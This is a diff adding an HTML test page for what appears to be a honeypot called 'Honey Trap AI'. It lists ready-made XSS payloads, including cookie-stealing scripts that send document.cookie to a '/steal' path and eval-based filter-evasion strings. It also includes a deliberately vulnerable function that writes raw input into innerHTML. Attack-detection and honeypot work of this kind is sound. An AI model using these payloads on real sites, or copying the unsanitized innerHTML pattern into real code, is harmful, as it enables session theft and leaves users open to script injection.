@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced XSS Test - Honey Trap AI</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #fff;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        .test-section {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        input[type="text"], input[type="email"], textarea, select {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.9);
+            color: #333;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        button {
+            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+            margin: 5px;
+        }
+        button:hover {
+            transform: translateY(-1px);
+        }
+        .payload {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            font-family: monospace;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .payload:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        .back-btn {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            margin-bottom: 20px;
+        }
+        .warning {
+            background: rgba(255, 193, 7, 0.2);
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button onclick="window.location.href='/'" class="back-btn">← Back to Home</button>
+        
+        <h1>🔥 Advanced XSS Attack Testing</h1>
+        
+        <div class="warning">
+            <strong>⚠️ Advanced Testing:</strong> This page contains sophisticated XSS attack vectors. 
+            All attacks will be detected and logged for security analysis.
+        </div>
+
+        <!-- Reflected XSS Test -->
+        <div class="test-section">
+            <h3>🎯 Reflected XSS Test</h3>
+            <form action="/reflected-xss" method="GET">
+                <div class="form-group">
+                    <label for="search">Search Query:</label>
+                    <input type="text" id="search" name="q" placeholder="Enter search term or XSS payload...">
+                </div>
+                <button type="submit">Search</button>
+            </form>
+            
+            <h4>Try these Reflected XSS payloads:</h4>
+            <div class="payload" onclick="document.getElementById('search').value='<script>alert(\"Reflected XSS\")</script>'">
+                &lt;script&gt;alert("Reflected XSS")&lt;/script&gt;
+            </div>
+            <div class="payload" onclick="document.getElementById('search').value='<img src=x onerror=alert(\"XSS\")>'">
+                &lt;img src=x onerror=alert("XSS")&gt;
+            </div>
+            <div class="payload" onclick="document.getElementById('search').value='javascript:alert(\"XSS\")'">
+                javascript:alert("XSS")
+            </div>
+        </div>
+
+        <!-- Stored XSS Test -->
+        <div class="test-section">
+            <h3>💾 Stored XSS Test</h3>
+            <form action="/stored-xss" method="POST">
+                <div class="form-group">
+                    <label for="comment">Comment:</label>
+                    <textarea id="comment" name="comment" rows="3" placeholder="Enter comment or XSS payload..."></textarea>
+                </div>
+                <div class="form-group">
+                    <label for="username">Username:</label>
+                    <input type="text" id="username" name="username" placeholder="Enter username or XSS payload...">
+                </div>
+                <button type="submit">Post Comment</button>
+            </form>
+            
+            <h4>Try these Stored XSS payloads:</h4>
+            <div class="payload" onclick="document.getElementById('comment').value='<script>alert(\"Stored XSS\")</script>'">
+                &lt;script&gt;alert("Stored XSS")&lt;/script&gt;
+            </div>
+            <div class="payload" onclick="document.getElementById('comment').value='<svg onload=alert(\"XSS\")>'">
+                &lt;svg onload=alert("XSS")&gt;
+            </div>
+            <div class="payload" onclick="document.getElementById('comment').value='<iframe src=javascript:alert(\"XSS\")>'">
+                &lt;iframe src=javascript:alert("XSS")&gt;
+            </div>
+        </div>
+
+        <!-- DOM-based XSS Test -->
+        <div class="test-section">
+            <h3>🌐 DOM-based XSS Test</h3>
+            <div class="form-group">
+                <label for="dom-input">DOM Input:</label>
+                <input type="text" id="dom-input" placeholder="Enter XSS payload for DOM manipulation...">
+                <button onclick="testDOMXSS()">Test DOM XSS</button>
+            </div>
+            <div id="dom-output"></div>
+            
+            <h4>Try these DOM XSS payloads:</h4>
+            <div class="payload" onclick="document.getElementById('dom-input').value='<script>alert(\"DOM XSS\")</script>'">
+                &lt;script&gt;alert("DOM XSS")&lt;/script&gt;
+            </div>
+            <div class="payload" onclick="document.getElementById('dom-input').value='<img src=x onerror=alert(\"DOM XSS\")>'">
+                &lt;img src=x onerror=alert("DOM XSS")&gt;
+            </div>
+            <div class="payload" onclick="document.getElementById('dom-input').value='<svg onload=alert(\"DOM XSS\")>'">
+                &lt;svg onload=alert("DOM XSS")&gt;
+            </div>
+        </div>
+
+        <!-- Cookie Stealing Test -->
+        <div class="test-section">
+            <h3>🍪 Cookie Stealing Test</h3>
+            <form action="/cookie-test" method="POST">
+                <div class="form-group">
+                    <label for="cookie-payload">Cookie Stealing Payload:</label>
+                    <textarea id="cookie-payload" name="payload" rows="3" placeholder="Enter cookie stealing payload..."></textarea>
+                </div>
+                <button type="submit">Test Cookie Stealing</button>
+            </form>
+            
+            <h4>Try these Cookie Stealing payloads:</h4>
+            <div class="payload" onclick="document.getElementById('cookie-payload').value='<script>fetch(\"/steal?cookie=\"+document.cookie)</script>'">
+                &lt;script&gt;fetch("/steal?cookie="+document.cookie)&lt;/script&gt;
+            </div>
+            <div class="payload" onclick="document.getElementById('cookie-payload').value='<img src=x onerror=this.src=\"/steal?cookie=\"+document.cookie>'">
+                &lt;img src=x onerror=this.src="/steal?cookie="+document.cookie&gt;
+            </div>
+            <div class="payload" onclick="document.getElementById('cookie-payload').value='<script>new Image().src=\"/steal?cookie=\"+document.cookie</script>'">
+                &lt;script&gt;new Image().src="/steal?cookie="+document.cookie&lt;/script&gt;
+            </div>
+        </div>
+
+        <!-- Filter Evasion Test -->
+        <div class="test-section">
+            <h3>🕵️ Filter Evasion Test</h3>
+            <form action="/filter-evasion" method="POST">
+                <div class="form-group">
+                    <label for="evasion-payload">Evasion Payload:</label>
+                    <textarea id="evasion-payload" name="payload" rows="3" placeholder="Enter filter evasion payload..."></textarea>
+                </div>
+                <button type="submit">Test Evasion</button>
+            </form>
+            
+            <h4>Try these Filter Evasion payloads:</h4>
+            <div class="payload" onclick="document.getElementById('evasion-payload').value='<ScRiPt>alert(\"XSS\")</ScRiPt>'">
+                &lt;ScRiPt&gt;alert("XSS")&lt;/ScRiPt&gt;
+            </div>
+            <div class="payload" onclick="document.getElementById('evasion-payload').value='<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>'">
+                &lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))&lt;/script&gt;
+            </div>
+            <div class="payload" onclick="document.getElementById('evasion-payload').value='<script>alert(String.fromCharCode(88,83,83))</script>'">
+                &lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
+            </div>
+            <div class="payload" onclick="document.getElementById('evasion-payload').value='<script>eval(unescape(\"alert%28%27XSS%27%29\"))</script>'">
+                &lt;script&gt;eval(unescape("alert%28%27XSS%27%29"))&lt;/script&gt;
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function testDOMXSS() {
+            const input = document.getElementById('dom-input').value;
+            const output = document.getElementById('dom-output');
+            
+            // Vulnerable DOM manipulation (for testing purposes)
+            output.innerHTML = '<h4>DOM Output:</h4><div>' + input + '</div>';
+        }
+        
+        // Test URL parameters for reflected XSS
+        const urlParams = new URLSearchParams(window.location.search);
+        const xssParam = urlParams.get('xss');
+        if (xssParam) {
+            document.getElementById('search').value = xssParam;
+        }
+    </script>
+</body>
+</html>
+
